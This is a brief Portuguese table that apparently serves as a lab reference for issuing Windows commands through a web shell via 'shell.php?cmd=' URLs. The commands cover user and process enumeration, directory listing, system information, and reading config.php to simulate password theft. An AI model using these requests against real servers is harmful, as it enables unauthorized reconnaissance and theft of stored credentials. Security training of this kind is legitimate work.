Comando URL de Acesso Descrição
whoami shell.php?cmd=whoami Exibe o nome do usuário que está executando o servidor (ex: SYSTEM, Apache, etc.)
dir shell.php?cmd=dir Lista os arquivos e pastas do diretório atual
cd .. && dir shell.php?cmd=cd .. && dir Sobe um nível no diretório e lista os arquivos
type config.php shell.php?cmd=type config.php Exibe o conteúdo de um arquivo de texto, útil para simular roubo de senhas
tasklist shell.php?cmd=tasklist Mostra todos os processos em execução no sistema
echo %USERNAME% shell.php?cmd=echo %USERNAME% Exibe o nome do usuário atual no Windows
net user shell.php?cmd=net user Lista todos os usuários cadastrados no sistema
systeminfo shell.php?cmd=systeminfo Mostra informações completas do sistema (Windows version, memória, nome da máquina, etc.)
